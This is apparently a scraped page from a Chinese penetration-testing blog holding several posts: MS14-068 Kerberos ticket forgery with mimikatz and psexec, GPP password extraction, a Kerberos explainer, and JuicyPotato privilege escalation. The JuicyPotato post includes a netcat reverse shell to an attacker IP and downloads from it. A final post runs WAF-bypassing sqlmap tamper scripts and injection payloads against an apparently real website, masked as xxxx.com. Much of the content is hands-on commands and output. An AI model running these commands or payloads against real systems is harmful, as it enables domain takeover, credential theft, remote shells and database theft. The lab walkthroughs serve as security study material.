+一、漏洞成因在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 
+什么是PAC（特权帐户证书）：
+PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。
+二、利用条件1.域控机器没有打漏洞补丁      补丁号：KB3011780
+2.拥有一台域内机子及其sid三、漏洞利用漏洞检测：FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)
+./FindSMB2UPTime.py 192.168.31.220
+DC is up since: 2013-12-28 22:24:25
+This DC is vulnerable to MS14-068获取域控制器补丁状态:Get-DCPatchStatus.ps1
+# This is an example script only.
+import-module activedirectory
+[string]$KBNumber = &quot;KB3011780&quot;
+$DomainControllers = Get-ADDomainController -filter *
+[int]$DomainControllersCount = $DomainControllers.Count
+[int]$PatchedDCCount = 0
+[int]$UnPatchedDCCount = 0
+$UnpatchedDCs = @()
+Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;
+ForEach ($DomainController in $DomainControllers)
+{
+    $DomainControllerHostName = $DomainController.HostName
+    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue
+
+    IF ($PatchStatus.InstalledOn)
+        {
+            $PatchStatusInstalledOn = $PatchStatus.InstalledOn
+            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;
+            $PatchedDCCount++
+        }
+    Else
+        {
+            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;
+            [array]$UnpatchedDCs += $DomainController.HostName
+            $UnPatchedDCCount++
+        }
+}
+Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;
+IF ($UnpatchedDCs)
+{
+    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;
+    $UnpatchedDCs
+}环境描述：
+目标机器：10.10.10.52  Windows Server 2008 R2 Standard
+已获取：DC上的一个普通本地账户
+
+james用户账户密码
+
+
+james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）
+
+攻击机：kali 10.10.14.14  （不在域中）
+在Linux上：(没有目标shell的情况下)1.安装客户端，在客户端生成票证
+sudo apt-get install krb5-user cifs-utils rdate2./etc/hosts中添加：（内网机器没有映射，所以需要添加）
+10.10.10.52 htb.local htb mantis.htb.local  mantis3.编辑/etc/krb5.conf
+[libdefaults]
+    default_realm = HTB.LOCAL
+
+[realms]
+   HTB.LOCAL = {
+    kdc = mantis.htb.local:88
+    admin_server = mantis.htb.local
+    default_domain = HTB.LOCAL
+    }
+[domain_realm]
+    .domain.internal = HTB.LOCAL
+    domain.internal = HTB.LOCAL4.添加路由：编辑/etc/resolve.conf
+nameserver 10.10.10.525.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）
+
+[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间
+
+[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间
+
+
+6.为james用户生成一张新的Kerberos票证
+kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit james
+klist
+此时生成的是jame是的票证：访问C$是没有权限的
+kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k
+tree connect failed: NT_STATUS_ACCESS_DENIED7.ms14-068生成高权限TGT票证
+
+8.替换低权限票证
+mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_10009.smb成功登录C$
+
+Mimikatz：先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令
+ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中
+mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket
+net use \\htb.local\admin$    ####使用IP可能会失败
+dir \\htb.local\c$ 
+psexec  \\htb.local  cmd.exe突破“本地账户才能漏洞利用”的限制：先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接原理：https://www.freebuf.com/vuls/56081.html
+GoldenPac,py也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）
+
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="Kerberos认证学习" alt="Kerberos认证学习" href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="Kerberos认证学习" alt="Kerberos认证学习"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; Kerberos认证学习 &gt;</div>
+                            <div class="content flex1">
+                                
+  Kerberos简介：
+
+Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）
+
+几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）
+
+Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥
+
+
+
+
+1、AS-REQClient将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS
+2、AS-REPAS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    
+AS向Clinet发送两条消息：        
+消息1包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;也就是使用TGS密钥加密TGT
+步骤1中用户提供的信息+TGS SESSION KEY                
+消息2包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     
+TGS名称/ID            
+时间戳            
+TGS SESSION KEY
+TGT生存期`消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY
+3、TGS-REQ(金票攻击发生在此步骤)
+Client向TGS发送两条消息消息1：[使用TGS SESSION KEY进行加密]  
+你的名称/ID
+时间戳`消息2：[未加密消息]
+所要请求服务的名称/ID
+服务的有效生存期同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在
+4、   TGS-REPTGS使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    
+步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较
+步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟
+检查TGT是否过期
+检查TGS缓存中是否已有该用户凭据，避免重播检查无误之后，同样向客户端发送两条消息
+消息1：[生成的使用Service Secret Key加密后的TGS]—-&gt;Kerberos令牌
+消息2：[TGS Session Key加密]    
+服务名称/ID   
+时间戳    
+票据生存期    
+Service Session Key5、AP-REQ银票攻击发生在此步骤
+Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    
+用户名称/ID
+时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
+6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="域内提权之滥用GGP" alt="域内提权之滥用GGP" href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="域内提权之滥用GGP" alt="域内提权之滥用GGP"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 域内提权之滥用GGP &gt;</div>
+                            <div class="content flex1">
+                                
+  在SYSVOL查找密码组策略首选项（GPP）中的密码
+原理：什么是GPP
+GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途
+一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。
+该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）
+这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
+漏洞利用：连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：
+\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml1、定位域控制器
+set l   
+nltest /DSGETDC:
+echo %logonserver%
+net time /domain
+......2、查询DC共享目录使用enumlinux或者smbmap检查共享目录：
+smbmap -H 10.10.10.100  ###列出目标用户共享列表
+---- -----------
+ADMIN$ NO ACCESS
+C$ NO ACCESS
+IPC$ NO ACCESS
+NETLOGON NO ACCESS
+replication read only   
+SYSVOL NO ACCESS
+Users NO ACCESS3、连接域共享
+smbclient //active.htb/Replication -N
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;4、解密使用gpprefdecrypt.py： 
+python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="JuicyPotato提权" alt="JuicyPotato提权" href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="JuicyPotato提权" alt="JuicyPotato提权"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; JuicyPotato提权 &gt;</div>
+                            <div class="content flex1">
+                                
+  项目地址：https://github.com/ohpe/juicy-potato/
+0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广
+利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
+whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken
+
+
+0x02、JuicyPotato功能自主选择CLSID
+-c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
+自定义COM监听端口
+-l : COM server listen port
+COM监听地址
+-m : COM server listen address (default 127.0.0.1)
+进程创建模块 
+-t createprocess call:  CreateProcessWithTokenW,  CreateProcessAsUser, &lt;*&gt; try both
+执行指定进程或脚本
+-p : program to launch
+为指定的执行进程选择参数
+-a : command line argument to pass to program (default NULL)
+RPC服务地址
+-k : RPC server ip address (default 127.0.0.1)
+RPC服务端口：
+-n : RPC server listen port (default 135)
+支持测试模块；测试并查找clsid
+-z only test CLSID and print token’s user
+0x03、JuicyPotato使用依赖于clsid：PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;
+
+反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
+echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
+./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;0x04、CLSID快速验证[1]获取可用CLSID列表
+提取CLSID Powershell脚本 GetCLSID.ps1
+同级目录下需要有Join-Object.ps1
+GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)
+Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
+Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
+powershell -ep bypass -f GetCLSID.ps1
+##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -枚举所有满足条件的CLSID:
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+Write-Host $a.CLSID
+}[2]批处理调用juicypotato.exe逐个测试CLSID
+test_clsid.bat:
+@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
+)0x05、限制条件
+需要支持SeImpersonate或者SeAssignPrimaryToken权限
+开启DCOM
+本地支持RPC或者远程服务器支持PRC并能成功登录
+能够找到可用的COM对象
+
+https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 22, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="一次注入实战引发的SQLMAP修改之路" alt="一次注入实战引发的SQLMAP修改之路" href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="一次注入实战引发的SQLMAP修改之路" alt="一次注入实战引发的SQLMAP修改之路"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 一次注入实战引发的SQLMAP修改之路 &gt;</div>
+                            <div class="content flex1">
+                                
+  首发于先知社区：https://xz.aliyun.com/t/6864
+#一、    前言SQLmap的payload修改一般有两种方式:  1、编写tamper  2、修改/添加sqlmap的xml文件语句自定义payload
+#二、    注入点Fuzz选中目标网站：http://www.xxxx.com/journals_desc.php?id=40单引号报错，对单引号进行转义，id=0=0测试回显正常，int型注入
+
+Order by 猜字段值为7
+Waf为Modsec，直接使用union select被拦截：
+
+Fuzz：
+单个union    #不拦截
+单个select    #不拦截
+Union select  #拦截
+union /**/ select #拦截
+/*!00000union*/ select #内联注释，不拦截
+/*!50000union*/ select 1,2,3,4,5,6,7 
+此处应该是涉及到强弱类型转换的问题，int为强类型，猜测对应的字段为弱类型解决方法：[1]使用string方法、但单引号’ 被被转义了,所以该方法行不通
+[2]采用报错注入
+#三、编写简单Tamper脚本绕过（使用自带的modsecurityzeroversioned.py不能绕过）
+报错注入过程中，发现主要过滤关键词from和函数concat（）
+1、concat()被过滤:concat()--&gt;concat/**/()  对应tamper脚本concat2concatcomment.py如下：
+#!/usr/bin/env python2
+&quot;&quot;&quot;
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file &apos;LICENSE&apos; for copying permission
+&quot;&quot;&quot;
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+return payload.replace(&quot;CONCAT&quot;,&quot;CONCAT/**/&quot;)2、from被过滤，from–&gt;/*!44144from*/对应tamper脚本from.py如下：
+#!/usr/bin/env python2
+&quot;&quot;&quot;
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file &apos;LICENSE&apos; for copying permission
+&quot;&quot;&quot;
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+return payload.replace(&quot;FROM&quot;,&quot;/*!44144FROM*/&quot;)验证：
+python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot; --force-ssl  --technique=E
+--dbs读取（可以比对一下使用tamper脚本和使用tamper脚本后语句）payload in sqlmap:
+1AND (SELECT 8403 &#x2F;*!44144FROM*&#x2F;(SELECT COUNT(*),CONCAT&#x2F;**&#x2F;(0x716b707071,(SELECT REPEAT(0x34,1024)),0x71627a7a71,FLOOR(RAND(0)*2))x &#x2F;*!44144FROM*&#x2F; INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+--tables读取，很遗憾，读取失败
+
+再次把它的payload拿到本地测试，也是行不通的。语句很长，需要慢慢fuzz究竟是哪里被拦截、组合、函数、关键字？
+但是，，，，坑的是竟然不是因为过滤引起的？？？？
+#四、修改SQLmap的xml文件语句实在不行了，去用手工注了出来，但是用SQLmap就是跑不出来？？？再去看一下SQLmap的payload是不是有问题，咋一看没什么大问题，所以我一开始也忽略了，卡了好久。也就是这里涉及到了直接修改SQLmap自带的语句。大家自行比较一下下面这两条语句看看能不能看出问题~1、
+https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.TABLES%20where%20table_schema=database())%20),1)2、
+https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.`TABLES`%20where%20table_schema=database())%20),1)下面讲几个概念
+[1]table和colums在mysql中是特殊字符
+[2]反引号是sql语言的转义字符
+[3]在mysql中的sql语句为了避免与系统冲突给表名加上反引号  ，（但在指定其他数据库时不能加，否则会被认作是表）
+我们可以看到这里sqlmap的payload,对于information_schema.tables中的tables并没有加反引号,指引到/xml/queries.xml
+information_schema.tables --&gt; information_schema.`tables`当然，columns也需要修改
+information_schema.columns --&gt; information_schema.`columns`修改之后跑表：
+python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot;   --technique=E   -D mililink_main --tablespayload in sqlamp（比对一下payload，看看效果）:
+66 AND (SELECT 9571 /*!44144FROM*/(SELECT COUNT(*),CONCAT/**/(0x716b7a6b71,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) /*!44144FROM*/ INFORMATION_SCHEMA.`TABLES` WHERE table_schema IN (0x6d696c696c696e6b5f6d61696e) LIMIT 15,1),0x7171767071,FLOOR(RAND(0)*2))x /*!44144FROM*/ INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+跑列值也是一样的，就不多说了，直接上图
+
+#五、关于SQLmap自定义payload的一些思考SQLmap的payload修改，其实并不复杂。
+tamper脚本的编写，可以参考上边的from.py和concat2concatcomment.py，它其实是有固定格式的。简单的自定义paylaod只需要在def tamper(payload, **kwargs)函数中写入替换语句即可。可参考https://payloads.online/archivers/2017-06-08/1
+修改/添加sqlmap的xml文件语句来自定义payload。需要找到对应的xml文件，然后修改xml文件中的语句。    查询语句在\sqlmap\data\xml\ queries.xml定义，若想自定义查询语句则只需要修改/添加想要执行的查询语句即可，如上边对INFORMATION_SCHEMA.TABLES的修改不同的注入方式使用的语句则需要在对应的注入方式中的xml语句进行修改，在\sqlmap\data\xml\payloads\文件下
+
+假若我们需要修改error-base注入方式的payload，则需要在/xml/payload/error_based.xml中修改
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="从两道靶场题目看XHR" alt="从两道靶场题目看XHR" href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/"
                        class="post-item swiper-slide flex flex-v">
